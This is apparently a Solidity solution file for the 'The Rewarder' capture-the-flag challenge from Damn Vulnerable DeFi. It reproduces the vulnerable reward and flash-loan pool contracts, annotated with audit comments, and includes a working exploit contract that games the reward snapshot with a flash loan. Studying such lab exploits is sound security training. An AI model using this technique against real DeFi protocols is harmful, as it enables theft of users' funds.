// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import { OwnableRoles } from "@solady/auth/OwnableRoles.sol";
import { FixedPointMathLib } from "@solady/utils/FixedPointMathLib.sol";
import { SafeTransferLib } from "@solady/utils/SafeTransferLib.sol";
import { ERC20 } from "@openzeppelin/contracts-v4.7.3/token/ERC20/ERC20.sol";
import { Address } from "@openzeppelin/contracts-v4.7.3/utils/Address.sol";
import { ERC20Snapshot } from "@openzeppelin/contracts-v4.7.3/token/ERC20/extensions/ERC20Snapshot.sol";
import { ReentrancyGuard } from "@openzeppelin/contracts-v4.7.3/security/ReentrancyGuard.sol";

import { DamnValuableToken } from "@contracts/CTF/Damn-Vulnerable-DeFi/00.Base/DamnValuableToken.sol";

contract RewardToken is ERC20, OwnableRoles {
    uint256 public constant MINTER_ROLE = _ROLE_0;

    constructor() ERC20("Reward Token", "RWT") {
        _initializeOwner(msg.sender);
        _grantRoles(msg.sender, MINTER_ROLE);
    }

    function mint(address to, uint256 amount) external onlyRoles(MINTER_ROLE) {
        _mint(to, amount);
    }
}

contract AccountingToken is ERC20Snapshot, OwnableRoles {
    uint256 public constant MINTER_ROLE = _ROLE_0;
    uint256 public constant SNAPSHOT_ROLE = _ROLE_1;
    uint256 public constant BURNER_ROLE = _ROLE_2;

    error NotImplemented();

    constructor() ERC20("rToken", "rTKN") {
        _initializeOwner(msg.sender);
        _grantRoles(msg.sender, MINTER_ROLE | SNAPSHOT_ROLE | BURNER_ROLE);
    }

    function mint(address to, uint256 amount) external onlyRoles(MINTER_ROLE) {
        _mint(to, amount);
    }

    function burn(address from, uint256 amount) external onlyRoles(BURNER_ROLE) {
        _burn(from, amount);
    }

    function snapshot() external onlyRoles(SNAPSHOT_ROLE) returns (uint256) {
        return _snapshot();
    }

    function _transfer(address, address, uint256) internal pure override {
        revert NotImplemented();
    }

    function _approve(address, address, uint256) internal pure override {
        revert NotImplemented();
    }
}

contract FlashLoanerPool is ReentrancyGuard {
    using Address for address;

    ERC20 public immutable liquidityToken;

    error NotEnoughTokenBalance();
    error CallerIsNotContract();
    error FlashLoanNotPaidBack();

    constructor(address liquidityTokenAddress) {
        liquidityToken = ERC20(liquidityTokenAddress);
    }

    function flashLoan(uint256 amount) external nonReentrant {
        uint256 balanceBefore = liquidityToken.balanceOf(address(this));

        if (amount > balanceBefore) {
            revert NotEnoughTokenBalance();
        }

        // @audit-issue can be bypassed if we call it from a constructor
        if (!msg.sender.isContract()) {
            revert CallerIsNotContract();
        }

        liquidityToken.transfer(msg.sender, amount);

        msg.sender.functionCall(abi.encodeWithSignature("receiveFlashLoan(uint256)", amount));

        if (liquidityToken.balanceOf(address(this)) < balanceBefore) {
            revert FlashLoanNotPaidBack();
        }
    }
}

contract TheRewarderPool {
    using FixedPointMathLib for uint256;

    // Minimum duration of each round of rewards in seconds
    uint256 private constant REWARDS_ROUND_MIN_DURATION = 5 days;

    uint256 public constant REWARDS = 100 ether;

    // Token deposited into the pool by users
    address public immutable liquidityToken;

    // Token used for internal accounting and snapshots
    // Pegged 1:1 with the liquidity token
    AccountingToken public immutable accountingToken;

    // Token in which rewards are issued
    RewardToken public immutable rewardToken;

    uint128 public lastSnapshotIdForRewards;
    uint64 public lastRecordedSnapshotTimestamp;
    uint64 public roundNumber; // Track number of rounds
    mapping(address => uint64) public lastRewardTimestamps;

    error InvalidDepositAmount();

    constructor(address _token) {
        // Assuming all tokens have 18 decimals
        liquidityToken = _token;
        accountingToken = new AccountingToken();
        rewardToken = new RewardToken();

        _recordSnapshot();
    }

    /**
     * @notice Deposit `amount` liquidity tokens into the pool, minting accounting tokens in exchange.
     *         Also distributes rewards if available.
     * @param amount amount of tokens to be deposited
     */
    function deposit(uint256 amount) external {
        if (amount == 0) {
            revert InvalidDepositAmount();
        }

        accountingToken.mint(msg.sender, amount);
        distributeRewards();

        SafeTransferLib.safeTransferFrom(liquidityToken, msg.sender, address(this), amount);
    }

    function withdraw(uint256 amount) external {
        accountingToken.burn(msg.sender, amount);
        SafeTransferLib.safeTransfer(liquidityToken, msg.sender, amount);
    }

    function distributeRewards() public returns (uint256 rewards) {
        if (isNewRewardsRound()) {
            _recordSnapshot();
        }

        uint256 totalDeposits = accountingToken.totalSupplyAt(lastSnapshotIdForRewards);
        uint256 amountDeposited = accountingToken.balanceOfAt(msg.sender, lastSnapshotIdForRewards);

        if (amountDeposited > 0 && totalDeposits > 0) {
            // @audit-issue doesn't take into consideration deposited time
            /// @dev Returns `floor(x * y / d)`.
            // (amountDeposited /totalDeposits)  * REWARDS

            rewards = amountDeposited.mulDiv(REWARDS, totalDeposits);
            if (rewards > 0 && !_hasRetrievedReward(msg.sender)) {
                // @audit-issue no CEI
                rewardToken.mint(msg.sender, rewards);
                lastRewardTimestamps[msg.sender] = uint64(block.timestamp);
            }
        }
    }

    function _recordSnapshot() private {
        lastSnapshotIdForRewards = uint128(accountingToken.snapshot());
        lastRecordedSnapshotTimestamp = uint64(block.timestamp);
        unchecked {
            ++roundNumber;
        }
    }

    function _hasRetrievedReward(address account) private view returns (bool) {
        return (
            lastRewardTimestamps[account] >= lastRecordedSnapshotTimestamp
                && lastRewardTimestamps[account] <= lastRecordedSnapshotTimestamp + REWARDS_ROUND_MIN_DURATION
        );
    }

    function isNewRewardsRound() public view returns (bool) {
        return block.timestamp >= lastRecordedSnapshotTimestamp + REWARDS_ROUND_MIN_DURATION;
    }
}

contract TheRewarderHack {
    FlashLoanerPool private flashLoanPool;
    TheRewarderPool private pool;
    DamnValuableToken private liquidityToken;
    RewardToken private reward;
    address internal player;

    constructor(address _flashloan, address _pool, address _liquidityToken, address _reward) {
        flashLoanPool = FlashLoanerPool(_flashloan);
        pool = TheRewarderPool(_pool);
        liquidityToken = DamnValuableToken(_liquidityToken);
        reward = RewardToken(_reward);
        player = msg.sender;
    }

    function attack() external {
        flashLoanPool.flashLoan(liquidityToken.balanceOf(address(flashLoanPool)));
    }

    function receiveFlashLoan(uint256 amount) external {
        liquidityToken.approve(address(pool), amount);
        // deposit liquidity token get reward token
        pool.deposit(amount);
        // withdraw liquidity token
        pool.withdraw(amount);
        // repay to flashloan
        liquidityToken.transfer(address(flashLoanPool), amount);
        uint256 rewardBalance = reward.balanceOf(address(this));
        reward.transfer(player, rewardBalance);
    }
}
